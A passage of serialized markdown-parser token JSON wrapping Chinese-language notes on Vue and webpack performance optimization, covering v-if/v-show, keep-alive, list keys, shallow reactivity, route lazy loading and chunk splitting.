相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>\\n","task":false,"loose":false,"text":"**1：** 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>","tokens":[{"type":"text","raw":"**1：** 合理使用v-show和v-if：<br/>\\n\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>","text":"**1：** 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理使用v-show和v-if：","text":" 合理使用v-show和v-if：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。","text":"\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。","text":"\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"}]}]},{"type":"list_item","raw":"* **1：** 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。\\n","task":false,"loose":false,"text":"**1：** 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","tokens":[{"type":"text","raw":"**1：** 优化组件的props和events传递：<br/>\\n\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","text":"**1：** 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化组件的props和events传递：","text":" 优化组件的props和events传递：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。","text":"\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","text":"\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。\\n","task":false,"loose":false,"text":"**1：** 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","tokens":[{"type":"text","raw":"**1：** 使用keep-alive缓存组件:<br/>\\n\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","text":"**1：** 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用keep-alive缓存组件:","text":" 使用keep-alive缓存组件:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。","text":"\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","text":"\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key\\n","task":false,"loose":false,"text":"**1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","tokens":[{"type":"text","raw":"**1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","text":"**1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 列表渲染优化: 为v-for列表添加key属性","text":" 列表渲染优化: 为v-for列表添加key属性","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。","text":"\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","text":"\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key","escaped":false}]}]},{"type":"list_item","raw":"* **2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。\\n","task":false,"loose":false,"text":"**2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。","tokens":[{"type":"text","raw":"**2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n\\n对对象的第一层数据进行响应式处理，减少性能消耗。","text":"**2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 数据响应式优化: 避免过度的响应式数据","text":" 数据响应式优化: 避免过度的响应式数据","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。","text":"\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。","text":"\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。","escaped":false}]}]},{"type":"list_item","raw":"* **2：** 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。\\n","task":false,"loose":false,"text":"**2：** 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","tokens":[{"type":"text","raw":"**2：** 路由层面优化: 路由懒加载<br/>\\n\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n\\n快首屏加载速度。<br/>\\n\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","text":"**2：** 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 路由层面优化: 路由懒加载","text":" 路由层面优化: 路由懒加载","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。","text":"\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","text":"\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>\\n","task":false,"loose":false,"text":"**1：** 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>","tokens":[{"type":"text","raw":"**1：** 代码压缩和混淆（Webpack 相关）<br/>\\n\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>","text":"**1：** 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码压缩和混淆（Webpack 相关）","text":" 代码压缩和混淆（Webpack 相关）","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。","text":"\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"}]}]},{"type":"list_item","raw":"* **1：** 合理设置chunk大小和数量（Webpack 相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","task":false,"loose":false,"text":"**1：** 合理设置chunk大小和数量（Webpack 相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","tokens":[{"type":"text","raw":"**1：** 合理设置chunk大小和数量（Webpack 相关）<br/>\\n\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","text":"**1：** 合理设置chunk大小和数量（Webpack 相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理设置chunk大小和数量（Webpack 相关）","text":" 合理设置chunk大小和数量（Webpack 